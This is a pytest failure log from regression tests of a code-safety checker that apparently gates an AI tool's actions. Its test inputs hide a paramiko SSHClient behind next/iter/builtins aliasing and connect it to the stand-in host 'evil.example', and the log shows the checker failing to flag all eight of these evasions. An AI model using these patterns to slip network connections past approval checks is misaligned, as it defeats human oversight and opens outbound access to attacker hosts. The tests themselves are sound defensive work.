@@ -1,0 +1,58 @@
+FFFFFFFF.                                                                [100%]
+=================================== FAILURES ===================================
+_ test_iterator_client_requires_approval[client=next(iter([paramiko.SSHClient()]))] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclient=next(iter([paramiko.SSHClient()]))\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[pool=[paramiko.SSHClient()]; iterator=iter(pool); client=next(iterator)] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\npool=[paramiko.SSHClient()]; iterator=iter(pool); client=next(iterator)\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[pick=next; iterate=iter; client=pick(iterate([paramiko.SSHClient()]))] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\npick=next; iterate=iter; client=pick(iterate([paramiko.SSHClient()]))\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[import builtins as b; client=b.next(b.iter([paramiko.SSHClient()]))] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nimport builtins as b; client=b.next(b.iter([paramiko.SSHClient()]))\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[from builtins import next as pick, iter as iterate; client=pick(iterate([paramiko.SSHClient()]))] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nfrom builtins import next as pick, iter as iterate; client=pick(iterate([paramiko.SSHClient()]))\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[client=next(reversed([paramiko.SSHClient()]))] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclient=next(reversed([paramiko.SSHClient()]))\nclient.connect(hostname='evil.example')", session_id='review')
+_ test_iterator_client_requires_approval[client=next(iter([]),paramiko.SSHClient())] _
+/evidence/round24_regressions.py:17: in test_iterator_client_requires_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclient=next(iter([]),paramiko.SSHClient())\nclient.connect(hostname='evil.example')", session_id='review')
+______________________ test_opaque_iterator_fails_closed _______________________
+/evidence/round24_regressions.py:22: in test_opaque_iterator_fails_closed
+    assert _check_code_safety("import paramiko; client=next(iterator); client.connect(hostname='evil.example')",session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client=next(iterator); client.connect(hostname='evil.example')", session_id='review')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[client=next(iter([paramiko.SSHClient()]))]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[pool=[paramiko.SSHClient()]; iterator=iter(pool); client=next(iterator)]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[pick=next; iterate=iter; client=pick(iterate([paramiko.SSHClient()]))]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[import builtins as b; client=b.next(b.iter([paramiko.SSHClient()]))]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[from builtins import next as pick, iter as iterate; client=pick(iterate([paramiko.SSHClient()]))]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[client=next(reversed([paramiko.SSHClient()]))]
+FAILED ../evidence/round24_regressions.py::test_iterator_client_requires_approval[client=next(iter([]),paramiko.SSHClient())]
+FAILED ../evidence/round24_regressions.py::test_opaque_iterator_fails_closed
+8 failed, 1 passed, 1 warning in 0.14s
